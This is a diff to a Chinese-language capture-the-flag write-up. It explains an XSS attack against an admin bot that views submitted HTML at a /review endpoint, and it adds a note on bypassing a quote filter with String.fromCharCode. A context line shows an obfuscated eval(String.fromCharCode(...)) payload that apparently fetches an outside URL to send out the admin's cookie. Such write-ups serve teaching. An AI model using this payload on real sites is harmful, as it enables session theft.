@@ -3,7 +3,8 @@
 post `/review`接口,会有一个浏览器来访问http://localhost:3000/admin/view?content?=${content}
 ,发送一个html文档,
 
-应该是xss读cookie,就是直接发个html,fetch,注意加个no-cors,不然无法跨域
+过滤了' " \` 使用String.fromCharCode绕过
+ 应该是xss读cookie,就是直接发个html,fetch,注意加个no-cors,不然无法跨域
 
 ```html
 <!DOCTYPE html>
@@ -19,6 +20,10 @@ eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,1
 </body>
 </html>
 ```
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240413232240.png)
+
+### imagehost
+
 
 
 # reverse
